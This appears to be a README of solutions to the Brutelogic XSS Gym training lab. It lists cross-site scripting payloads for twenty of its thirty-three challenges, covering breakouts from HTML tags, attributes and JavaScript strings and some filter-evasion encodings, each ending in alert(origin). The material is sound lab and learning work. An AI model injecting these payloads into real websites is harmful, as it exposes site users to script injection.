# Brutelogic_XSS_GYM
Soloution of XSS gym



p01: Injection in Title Tag:                                               </title><script>alert(origin)</script>

p02: Injection in Noscript Tag:                                            </noscript><script>alert(origin)</script>

p03: Injection in Style Tag:                                               </style><script>alert(origin)</script>

p04: Filtered Injection Inside Event Handler:                              %26apos;-alert(origin)-%26apose;

p05: Injection in Regular Tags:                                            <script>alert(origin)</script>

p06: Injection in Attribute Value – Double Quote Delimiter                 "><script>alert(origin)</script>

p07: Injection in Attribute Value – Single Quote Delimiter                 %27%20><script>alert(origin)</script>

p08: Filtered Injection in Attribute Value – Double Quote Delimiter        "%20autofocus=true%20onfocus=%27alert(origin)%27

p09: Filtered Injection in Attribute Value – Single Quote Delimiter        %27%20%20autofocus=true%20onfocus=%27alert(origin)

p10: Injection in Textarea Tag                                             </textarea><script>alert(origin)</script>

p11: Injection in Script Tag – Single Quote Delimiter                      </script><script>alert(origin)</script>

p12: Injection in Script Tag – Double Quote Delimiter                      </script><script>alert(origin)</script>

p13: Injection in Javascript Variable – Single Quote Delimiter             1%27;alert(origin);var%20pp=%20%271

p14: Injection in Javascript Variable – Double Quote Delimiter             1";alert(origin);var%20pp=%20"1

p15: Filtered Injection in Javascript Variable – Single Quote Delimiter    1%5c%27;alert(origin);//

p16: Filtered Injection in Javascript Variable – Double Quote Delimiter    1%5c";alert(origin);//

p17: Injection in Script Tag – Backticks Delimiter                         </script><script>alert(origin)</script>

p18: Injection in Javascript Variable – Backticks Delimiter                x`;alert(origin);//

p19: Filtered Injection in Javascript Variable – Backticks Delimiter       x\`;alert(origin);//

p20: Filtered Injection in Javascript Variable – Backticks Delimiter       ${alert(origin)}

p21: Validated Injection in HTTP Reference

p22: Injection in Iframe Tag

p23: Injection in HTTP Header

p24: Filtered Double Injection in Javascript Variable

p25: Injection in Javascript DOM – Document Sink

p26: Injection in Javascript DOM – Location Sink

p27: Injection in Javascript DOM – Execution Sink

p28: Injection in HTML Comments

p29: Filtered Injection in HTML Comments

p30: Filtered Injection in Javascript DOM – Document Sink

p31: Injection in Script Tag With Header

p32: Injection in URL

p33: Injection Bypassing CSP
